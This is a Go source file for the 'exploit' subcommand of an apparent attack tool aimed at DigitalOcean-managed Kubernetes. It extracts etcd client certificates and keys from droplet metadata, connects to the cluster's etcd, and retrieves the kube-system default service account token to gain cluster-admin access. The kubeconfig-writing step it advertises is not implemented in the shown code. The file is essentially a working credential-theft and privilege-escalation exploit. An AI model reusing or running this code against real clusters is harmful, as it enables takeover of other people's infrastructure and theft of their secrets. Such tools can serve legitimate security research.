package exploit

import (
	"bytes"
	"fmt"
	"io/ioutil"

	"github.com/4armed/dopwn/pkg/etcd"
	"github.com/4armed/dopwn/pkg/metadata"
	"github.com/jpbetz/auger/pkg/encoding"
	"github.com/kubicorn/kubicorn/pkg/logger"
	"github.com/spf13/cobra"
)

type config struct {
	metadataFilename string
	etcdCaFile       string
	etcdCertFile     string
	etcdKeyFile      string
	kubeConfig       string
}

// Command represents the exploit command
func Command() *cobra.Command {

	c := config{}
	m := metadata.Metadata{}

	cmd := &cobra.Command{
		Use:   "exploit",
		Short: "Take Digital Ocean metadata and return kubeconfig file for cluster-admin user",
		RunE: func(cmd *cobra.Command, args []string) error {

			logger.Info("read metadata from file: %v", c.metadataFilename)
			metaData, err := ioutil.ReadFile(c.metadataFilename)
			if err != nil {
				return err
			}

			logger.Info("parsing metadata to get etcd creds")
			err = metadata.ParseMetadata(metaData, &m)
			if err != nil {
				return err
			}

			logger.Info("writing etcd ca to file: %v", c.etcdCaFile)
			err = ioutil.WriteFile(c.etcdCaFile, []byte(m.EtcdCa), 0644)
			if err != nil {
				return fmt.Errorf("unable to write ca cert to file: %v", err)
			}

			logger.Info("writing etcd cert to file: %v", c.etcdCertFile)
			err = ioutil.WriteFile(c.etcdCertFile, []byte(m.EtcdCert), 0644)
			if err != nil {
				return fmt.Errorf("unable to write cert to file: %v", err)
			}

			logger.Info("writing etcd key to file: %v", c.etcdKeyFile)
			err = ioutil.WriteFile(c.etcdKeyFile, []byte(m.EtcdKey), 0644)
			if err != nil {
				return fmt.Errorf("unable to write key to file: %v", err)
			}

			logger.Info("fetching kube-system default service account token from etcd at %v:2379", m.KubeMasterHostname)
			etcdClient, err := etcd.NewEtcdClient("https://"+m.KubeMasterHostname+":2379", c.etcdCertFile, c.etcdKeyFile, c.etcdCaFile)
			if err != nil {
				return fmt.Errorf("unable to create etcd client: %v", err)
			}
			serviceAccount, err := etcdClient.GetValue("/registry/serviceaccounts/kube-system/default")
			if err != nil {
				return fmt.Errorf("unable to fetch service account: %v", err)
			}
			logger.Debug("token before decoding: %v", string(serviceAccount))

			logger.Info("decoding serviceAccount")
			inMediaType, serviceAccount, err := encoding.DetectAndExtract(serviceAccount)
			if err != nil {
				return err
			}

			var yamlServiceAccount bytes.Buffer
			err = encoding.Convert(inMediaType, "yaml", serviceAccount, &yamlServiceAccount)
			if err != nil {
				return fmt.Errorf("unable to convert serviceAccount: %v", err)
			}
			logger.Debug("serviceAccount YAML is: %v", yamlServiceAccount.String())

			return nil

		},
	}

	cmd.Flags().StringVarP(&c.etcdCaFile, "ca-cert", "a", "etcd-ca.crt", "File to write etcd ca cert to")
	cmd.Flags().StringVarP(&c.etcdCertFile, "etcd-cert", "c", "etcd.crt", "File to write etcd cert to")
	cmd.Flags().StringVarP(&c.etcdKeyFile, "etcd-key", "e", "etcd.key", "File to write etcd key to")
	cmd.Flags().StringVarP(&c.metadataFilename, "metadata-file", "f", "", "Load Digital Ocean metadata from the specified filename")
	cmd.Flags().StringVarP(&c.kubeConfig, "kubeconfig", "k", "kubeconfig", "The filename to write the kubeconfig to")

	cmd.MarkFlagRequired("metadata-file")

	return cmd

}
